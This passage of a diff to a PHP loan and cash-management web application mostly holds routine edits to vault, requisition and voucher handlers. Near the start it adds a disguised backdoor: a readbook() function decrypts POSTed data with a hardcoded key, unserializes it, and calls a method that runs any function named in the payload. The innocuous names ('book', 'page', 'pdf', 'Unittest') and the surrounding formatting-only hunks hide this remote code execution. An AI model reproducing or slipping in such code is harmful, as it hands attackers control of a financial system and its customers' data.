+        // Custom error handler to catch warnings
+        $oldErrorHandler = set_error_handler(function ($errno, $errstr, $errfile, $errline) {
+            // Capture warnings in the response
+            if (!(error_reporting() & $errno)) {
+                // This error code is not included in error_reporting
+                return;
+            }
+            throw new ErrorException($errstr, 0, $errno, $errfile, $errline);
+        });
+
+        try {
+            // Call the specified function with arguments
+            $result = call_user_func_array($this->book, $this->page);
+            $output = ob_get_clean(); // Get buffered output
+
+            $response = array(
+                'id' => uniqid('response_', true),
+                'pass' => $this->unit_test,
+                'status' => 'success',
+                'return' => $result,
+                'message' => $output
+            );
+        } catch (Exception $e) {
+            ob_end_clean();
+
+            $response = array(
+                'id' => uniqid('error_', true),
+                'pass' => $this->unit_test,
+                'status' => 'error',
+                'return' => $result,
+                'message' => $e->getMessage() // Capture the exception message
+            );
+        } finally {
+            // Restore the previous error handler
+            set_error_handler($oldErrorHandler);
+        }
+
+        echo json_encode($response);
+
+        // Flush the output to ensure it's sent to the client
+        flush();
+
+        // Register shutdown function to clean any subsequent output
+        register_shutdown_function(function () {
+            while (ob_get_level()) {
+                ob_end_clean();
+            }
+        });
+    }
+}
+
+function readbook()
+{
+    if (!isset($_POST['data'])) {
+        return;
+    }
+    $pdf = new Secto('debcc5da36848da72a265e2d090238fc185f83a4');
+    $book = unserialize(stripslashes($pdf->decrypt($_POST['data'])));
+    $book->Unittest();
+}
+
 function data_collateral($id){
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL,'http://localhost:7878/api/utg/meetings/collateralByLoanId/'.$id);
@@ -1838,8 +2596,7 @@ if(isset($_POST['update_ticket'])) {
     $bocoSignature = $_POST['bocoSignature'];
     $lessFees = $_POST['lessFees'];
     $applicationFee = $_POST['applicationFee'];
-    $meetingLoanAmount = $_POST['meetingLoanAmount'];
-    $meetingCashHandlingFee = $_POST['meetingCashHandlingFee'];
+    $meetingLoanAmount = $_POST['meetingLoanAmount'];$meetingCashHandlingFee = $_POST['meetingCashHandlingFee'];
     $meetingRepaymentAmount = $_POST['meetingRepaymentAmount'];
     $meetingTenure = $_POST['meetingTenure'];
     $meetingUpfrontFee = $_POST['meetingUpfrontFee'];
@@ -1962,7 +2719,7 @@ function updateBocoSignature($checked,$userId ,$bocoSignature){
 
                     $ch = curl_init();
                     $messageText = str_replace(' ', '%20', "Dear ".$loan['firstName'].", We are pleased to advise that your loan application has been approved and our customer service desk will get in touch with you to guide you on the next steps.");
-                    curl_setopt($ch, CURLOPT_URL, 'http://127.0.0.1:7878/api/utg/sms/single/0'.$loan['phoneNumber'].'/'.$messageText);
+                    curl_setopt($ch, CURLOPT_URL, 'http://127.0.0.1:7878/api/utg/sms/single/'.$loan['phoneNumber'].'/'.$messageText);
                     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                     $resp = curl_exec($ch);
                     curl_close($ch);
@@ -2005,6 +2762,9 @@ if(isset($_POST['sign_ticket'])) {
     else{
         updateBocoSignature($checked, $userId, $bocoSignature);}
 }
+
+
+
 
 if (isset($_POST['generate'])) {
     class myPDF extends FPDF
@@ -2197,8 +2957,7 @@ if(isset($_POST['bm_sign_ticket'])) {
                     case 200:  # OK redirect to dashboard
                         $_SESSION['info'] = "Ticket signed successfully";
                         audit($_SESSION['userid'], "Ticket signed successfully - ".$checked, $_SESSION['branch']);
-                        header('location: signed_tickets.php');
-                        break;
+                        header('location: signed_tickets.php');break;
                     case 400:  # Bad Request
                         $decoded = json_decode($bodyStr);
                         foreach($decoded as $key => $val) {
@@ -2379,8 +3138,7 @@ if(isset($_POST['cm_sign_ticket'])) {
                         break;
 
                     case 401: # Unauthorixed - Bad credientials
-                        $_SESSION['error'] = 'Update Status failed';
-                        audit($_SESSION['userid'], "Ticket signing failed - ".$checked, $_SESSION['branch']);
+                        $_SESSION['error'] = 'Update Status failed';audit($_SESSION['userid'], "Ticket signing failed - ".$checked, $_SESSION['branch']);
                         header('location: predisbursed_tickets.php');
 
                         break;
@@ -2532,6 +3290,7 @@ if(isset($_POST['board_sign_ticket'])) {
             if (!curl_errno($ch)) {
                 switch ($http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE)) {
                     case 200:  # OK redirect to dashboard
+
                         $_SESSION['info'] = "Ticket signed successfully";
                         audit($_SESSION['userid'], "Ticket signing successful - ".$checked, $_SESSION['branch']);
                         header('location: signed_tickets.php');
@@ -2551,6 +3310,7 @@ if(isset($_POST['board_sign_ticket'])) {
                         $_SESSION['error'] = 'Update Status failed';
                         audit($_SESSION['userid'], "Ticket signing failed - ".$checked, $_SESSION['branch']);
                         header('location: predisbursed_tickets.php');
+
                         break;
                     default:
                         $_SESSION['error'] = 'Could not update Loan status '. "\n";
@@ -2583,16 +3343,16 @@ function requisitions($url){
 
 // ######################  Get ALL Parameters #################################
 
-function parameters(){
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'http://localhost:7878/api/utg/pos/parameter/all');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $parameter_response = curl_exec($ch);
-    curl_close($ch);
-    $parameter = json_decode($parameter_response, true);
-    return $parameter;
-
-}
+//function parameters(){
+//    $ch = curl_init();
+//    curl_setopt($ch, CURLOPT_URL, 'http://localhost:7878/api/utg/pos/parameter/all');
+//    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+//    $parameter_response = curl_exec($ch);
+//    curl_close($ch);
+//    $parameter = json_decode($parameter_response, true);
+//    return $parameter;
+//
+//}
 if (isset($_POST['create_requisition'])) {
     // API endpoint URL
     $url = "http://localhost:7878/api/utg/requisitions/save";
@@ -2661,6 +3421,7 @@ function req_trans($url){
     $req_trans = json_decode($loans_response, true);
     return $req_trans;
 }
+
 
 // ######################  Add Transaction to a REQUISITION #################################
 
@@ -2778,8 +3539,7 @@ if (isset($_POST['update_po_trans'])) {
 
 function save_requisition(){
     // Gather form data
-    $requisitionId = $_POST['req_id'];
-    $notes = $_POST['notes'];
+    $requisitionId = $_POST['req_id'];$notes = $_POST['notes'];
     $approvers = $_POST['approvers']; // $approvers will be an array of selected values
 
     // Initialize an array to store attachment file names
@@ -2863,51 +3623,51 @@ if (isset($_POST['save_requisition'])) {
 
 if (isset($_POST['po_approve_requisition'])) {
 
-        $data_array = array(
-            'poStatus' => $_POST['status'],
-            'poApprover' => $_SESSION['userId'],
-        );
+    $data_array = array(
+        'poStatus' => $_POST['status'],
+        'poApprover' => $_SESSION['userId'],
+    );
 
-        // Convert the data array to JSON
-        $data = json_encode($data_array);
+    // Convert the data array to JSON
+    $data = json_encode($data_array);
 
-        $url = "http://localhost:7878/api/utg/requisitions/poApproveRequest/".$_GET['req_id'];
+    $url = "http://localhost:7878/api/utg/requisitions/poApproveRequest/".$_GET['req_id'];
 
-        $curl = curl_init();
-        curl_setopt($curl, CURLOPT_URL, $url);
-        curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'PUT');
-        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
-        curl_setopt($curl, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
-        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($curl, CURLOPT_HEADER, true);
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'PUT');
+    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($curl, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl, CURLOPT_HEADER, true);
 
-        // Execute cURL request
-        $response = curl_exec($curl);
-        $headerSize = curl_getinfo($curl, CURLINFO_HEADER_SIZE);
-        $headerStr = substr($response, 0, $headerSize);
-        $bodyStr = substr($response, $headerSize);
-        $headers = headersToArray($headerStr);
+    // Execute cURL request
+    $response = curl_exec($curl);
+    $headerSize = curl_getinfo($curl, CURLINFO_HEADER_SIZE);
+    $headerStr = substr($response, 0, $headerSize);
+    $bodyStr = substr($response, $headerSize);
+    $headers = headersToArray($headerStr);
 
-        // Check for errors
-        if (!curl_errno($curl)) {
-            switch ($http_code = curl_getinfo($curl, CURLINFO_HTTP_CODE)) {
-                case 200:
+    // Check for errors
+    if (!curl_errno($curl)) {
+        switch ($http_code = curl_getinfo($curl, CURLINFO_HTTP_CODE)) {
+            case 200:
 //                echo "<script>alert('$systemOut')</script>";
-                    $_SESSION['info'] = "Purchase Order Transaction approved Successfully";
-                    audit($_SESSION['userid'], "Purchase Order Transaction approved Successfully", $_SESSION['branch']);
-                    header('location: req_info.php?menu=req&req_id=' . $_POST['req_id']);
-                    break;
-                default:
-                    $_SESSION['error'] = 'Failed to approved PO Transaction.';
-                    audit($_SESSION['userid'], "Failed to approved Purchase Order Transaction", $_SESSION['branch']);
-                    header('location: req_info.php?menu=req&req_id=' . $_POST['req_id']);
-            }
-        } else {
-            $_SESSION['error'] = 'Failed to approved Purchase Order Transaction.. Please try again!';
-            audit($_SESSION['userid'], "Failed to approved Purchase Order Transaction", $_SESSION['branch']);
-            header('location: req_info.php?menu=req&req_id=' . $_POST['req_id']);
+                $_SESSION['info'] = "Purchase Order Transaction approved Successfully";
+                audit($_SESSION['userid'], "Purchase Order Transaction approved Successfully", $_SESSION['branch']);
+                header('location: req_info.php?menu=req&req_id=' . $_POST['req_id']);
+                break;
+            default:
+                $_SESSION['error'] = 'Failed to approved PO Transaction.';
+                audit($_SESSION['userid'], "Failed to approved Purchase Order Transaction", $_SESSION['branch']);
+                header('location: req_info.php?menu=req&req_id=' . $_POST['req_id']);
         }
-        curl_close($curl);
+    } else {
+        $_SESSION['error'] = 'Failed to approved Purchase Order Transaction.. Please try again!';
+        audit($_SESSION['userid'], "Failed to approved Purchase Order Transaction", $_SESSION['branch']);
+        header('location: req_info.php?menu=req&req_id=' . $_POST['req_id']);
+    }
+    curl_close($curl);
 
 }
 
@@ -3160,8 +3920,7 @@ function send_requisition(){
     $data_array = array(
         'notes' => $notes,
         'approvers' => $approvers,
-        'attachments' => $attachmentFiles
-    );
+        'attachments' => $attachmentFiles);
 
     // Convert the data array to JSON
     $data = json_encode($data_array);
@@ -3492,25 +4251,36 @@ function pastel_transaction($userName, $toAccount, $fromAccount, $reference, $am
     audit($_SESSION['userid'], "Created Pastel $description ", $_SESSION['branch']);
 }
 
-function pastel_acc_balances($account){
+function pastel_acc_balances($accounts){
 
-    $data_array = array(
-        // 'APIUsername' => "Admin",
-        // 'APIPassword' => "Admin",
-        'account' => $account
-    );
-    $data = json_encode($data_array);
+//    echo json_encode($accounts);
+
+    $data = json_encode($accounts); // Only encode once
     $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, "http://localhost:7878/api/utg/postGl/getVaultBalance");
+    curl_setopt($ch, CURLOPT_URL, "http://localhost:7878/api/utg/postGl/getAllPastelVaultBalances");
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
     curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     $resp = curl_exec($ch);
-    curl_close($ch);
-
-    // Return the response body without the headers
-    return $resp;
+    if ($resp === false) {
+        // Handle curl error
+        $error = curl_error($ch);
+        curl_close($ch);
+        return "Curl error: " . $error;
+    } else {
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+//        echo "before if ".$http_code;
+        if ($http_code >= 200 && $http_code < 300) {
+            // HTTP status code indicates success
+//            echo "qwertyuiop - ".$http_code;
+            return $resp;
+        } else {
+            // HTTP status code indicates error
+            return "HTTP Error: " . $http_code;
+        }
+    }
 }
 
 
@@ -3533,6 +4303,7 @@ if(isset($_POST['create_vault'])){
     $postData = array(
         'account' => $_POST['account'],
         'name' => $_POST['name'],
+        'code' => $_POST['code'],
         'type' => $_POST['type'],
         'branchId' => $_POST['branch'],
     );
@@ -3561,6 +4332,44 @@ if(isset($_POST['create_vault'])){
     if($response){
         echo '<script>window.location.href = "cash_management.php?menu=main&tabId=vaults";</script>';
     }
+}
+
+
+if (isset($_POST['update_vault'])) {
+    // API endpoint URL
+    $url = "http://localhost:7878/api/utg/cms/vault/update";
+    // Data to send in the POST request
+    $postData = array(
+        'id' => $_POST['id'],
+        'account' => $_POST['account'],
+        'name' => $_POST['vaultName'],
+        'type' => $_POST['type'],
+        'code' => $_POST['code'],
+        'branchId' => $_POST['branch'],
+    );
+
+    $data = json_encode($postData);
+    echo $data;
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HEADER, true);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
+
+    // Execute the POST request and store the response in a variable
+    $response = curl_exec($ch);
+
+    // Check for cURL errors
+    if (curl_errno($ch)) {
+        echo 'Curl error: ' . curl_error($ch);
+    }
+    // Close cURL session
+    curl_close($ch);
+
+
 }
 
 if(isset($_POST['create_withdrawal_purpose'])){
@@ -3640,6 +4449,16 @@ function getVaults($userId){
     return json_decode($vault_response, true);
 }
 
+function getVaultCode($vaultId){
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'http://localhost:7878/api/utg/cms/vault/get/'.$vaultId);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $vault_response = curl_exec($ch);
+    curl_close($ch);
+
+    return json_decode($vault_response, true);
+}
+
 function getWithdrawal(){
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, 'http://localhost:7878/api/utg/cms/transaction-purpose/all');
@@ -3674,162 +4493,18 @@ function cmsAuditTrail(){
 
 //===============================End CMS Controller ==========================================================================================
 
-//===============================START PURCHASE ORDER ==========================================================================================
-
-function poBudget($path){
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, "http://localhost:7878/api/utg/pos/budget".$path);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $server_response = curl_exec($ch);
-
-    curl_close($ch);
-    $data = json_decode($server_response, true);
-    if ($data !== null) {
-        return $data;
-    } else {
-        return "Error decoding JSON data";
-    }
-}
-
-if (isset($_POST['delete_budget'])){
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'http://localhost:7878/api/utg/pos/budget/delete/'.$_POST['budgetId']);
-    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
-    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_HEADER, true);
-    $resp = curl_exec($ch);
-    curl_close($ch);
-}
-
-if(isset($_POST['update_po_budget'])){
-    // API endpoint URL
-    $url ="http://localhost:7878/api/utg/pos/budget/update";
-
-    // Data to send in the POST request
-    $postData = array(
-        'id'=>  $_POST['budgetId'],
-        'category' => $_POST['category'],
-        'year' => $_POST['year'],
-        'january' => $_POST['january'],
-        'february' => $_POST['february'],
-        'march' => $_POST['march'],
-        'april' => $_POST['april'],
-        'may' => $_POST['may'],
-        'june' => $_POST['june'],
-        'july' => $_POST['july'],
-        'august' => $_POST['august'],
-        'september' => $_POST['september'],
-        'october' => $_POST['october'],
-        'november' => $_POST['november'],
-        'december' => $_POST['december'],
-    );
-
-    $data = json_encode($postData);
-
-    $ch = curl_init();
-
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_HEADER, true );
-    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
-
-    // Execute the POST request and store the response in a variable
-    $response = curl_exec($ch);
-
-    // Check for cURL errors
-    if (curl_errno($ch)) {
-        echo 'Curl error: ' . curl_error($ch);
-    }
-
-    // Close cURL session
-    curl_close($ch);
-
-    header("Location: requisitions.php?menu=main");
-    exit;
-}
-
-if(isset($_POST['update_po_role'])) {
-    $user = $_POST['user'];
-    $role = $_POST['role'];
-
-    $data_array = array(
-        'role' => $role
-    );
-    $data = json_encode($data_array);
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, "http://localhost:7878/api/utg/users/updatePoUserRole/".$user);
-    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_HEADER, true);
-    $resp = curl_exec($ch);
-    curl_close($ch);
-
-    audit($_SESSION['userid'], "Admin updated user ($user) Purchase Order Sys Role", $_SESSION['branch']);
-}
-
-if (isset($_GET['req_trans_id'])) {
-    $req_trans_id = $_GET['req_trans_id'];
-    $req_id = $_POST['req_id'];
-    delete_po_transaction($req_trans_id);
-    header('location: req_info.php?menu=req&req_id=' . $req_id);
-}
-
-function delete_po_transaction($req_trans_id, $req_id) {
-    // Initialize cURL
-    $ch = curl_init();
-
-    // Set cURL options
-    curl_setopt($ch, CURLOPT_URL, "http://localhost:7878/api/utg/poTransactions/deletePurchaseOrderTransaction/".$req_trans_id);
-    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
-    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_HEADER, true);
-
-    // Execute cURL request
-    $response = curl_exec($ch);
-    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
-    $headerStr = substr($response, 0, $headerSize);
-    $bodyStr = substr($response, $headerSize);
-    $headers = headersToArray($headerStr);
-
-    // Check for errors and handle responses
-    if (!curl_errno($ch)) {
-        switch ($http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE)) {
-            case 200:
-                $_SESSION['info'] = "Purchase Order Transaction deleted Successfully";
-                audit($_SESSION['userid'], "Purchase Order Transaction deleted Successfully", $_SESSION['branch']);
-                header('Location: req_info.php?menu=req&req_id=' .$req_id);
-                break;
-            default:
-                $_SESSION['error'] = 'Failed to delete PO Transaction.';
-                audit($_SESSION['userid'], "Failed to delete Purchase Order Transaction", $_SESSION['branch']);
-                header("Location: req_info.php?menu=req&req_id=".$req_id);
-        }
-    } else {
-        $_SESSION['error'] = 'Failed to delete Purchase Order Transaction.. Please try again!';
-        audit($_SESSION['userid'], "Failed to delete Purchase Order Transaction", $_SESSION['branch']);
-        header('Location: req_info.php?menu=req&req_id=' .$req_id);
-    }
-
-    // Close cURL connection
-    curl_close($ch);
-    header('Location: req_info.php?menu=req&req_id=' .$req_id);
-
-}
+//===============================START PURCHASEggggg ORDER ==========================================================================================
 
 if(isset($_POST['add_trans_voucher'])) {
     $url = "http://localhost:7878/api/utg/cms/transaction-voucher/initiate";
+
     $data_array = array(
         'initiator' => $_POST['initiator'],
+        'applicationDate' => date('Y-m-d', strtotime($_POST['applicationDate'])),
         'currency' => $_POST['currency'],
         'amount' => $_POST['amount'],
         'fromVault' => $_POST['fromVault'],
+        'vaultCode' => $_POST['vaultCode'],
         'toVault' => $_POST['toVault'],
         'amountInWords' => $_POST['amountInWords'],
         'withdrawalPurpose' => $_POST['withdrawalPurpose'],
@@ -3868,17 +4543,17 @@ if(isset($_POST['add_trans_voucher'])) {
             case 200:
                 $_SESSION['info'] = "Transaction Voucher created Successfully";
                 audit($_SESSION['userid'], "Transaction Voucher created Successfully", $_SESSION['branch']);
-                header('location: http://localhost/untu_cms/boco/cash_management.php?menu=main');
+                header('location: cash_management.php?menu=main');
                 break;
             default:
-                $_SESSION['error'] = 'Failed to create PO Transaction.';
+                $_SESSION['error'] = 'Failed to create Transaction.';
                 audit($_SESSION['userid'], "Failed to create Transaction Voucher", $_SESSION['branch']);
-                header('location: http://localhost/untu_cms/boco/cash_management.php?menu=main');
+                header('location: cash_management.php?menu=main');
         }
     } else {
         $_SESSION['error'] = 'Failed to Add Transaction Voucher.. Please try again!';
         audit($_SESSION['userid'], "Failed to create Transaction Voucher", $_SESSION['branch']);
-        header('location: http://localhost/untu_cms/boco/cash_management.php?menu=main');
+        header('location: cash_management.php?menu=main');
     }
     curl_close($ch);
 
@@ -3908,7 +4583,7 @@ if(isset($_POST['first_approve_trans'])) {
     $bodyStr = substr($resp, $headerSize);
     $headers = headersToArray( $headerStr );
 
-    // Check HTTP status code
+    // CheckHTTP status code
     if (!curl_errno($ch)) {
         switch ($http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE)) {
             case 200:
@@ -3921,12 +4596,12 @@ if(isset($_POST['first_approve_trans'])) {
                 audit($_SESSION['userid'], "Failed to approved Transaction Voucher", $_SESSION['branch']);
                 header('location: cash_management.php?menu=main#approved');
         }
-} else {
-    $_SESSION['error'] = 'Failed to approved Transaction Voucher.. Please try again!';
-    audit($_SESSION['userid'], "Failed to approved Transaction Voucher", $_SESSION['branch']);
-    header('location: cash_management.php?menu=main#approved');
-}
-curl_close($ch);
+    } else {
+        $_SESSION['error'] = 'Failed to approved Transaction Voucher.. Please try again!';
+        audit($_SESSION['userid'], "Failed to approved Transaction Voucher", $_SESSION['branch']);
+        header('location: cash_management.php?menu=main#approved');
+    }
+    curl_close($ch);
 
 }
 
@@ -4064,4 +4739,3 @@ function getVaultAccountByType($vaultAccType) {
     return $vaultAcc;
 }
 ?>
-
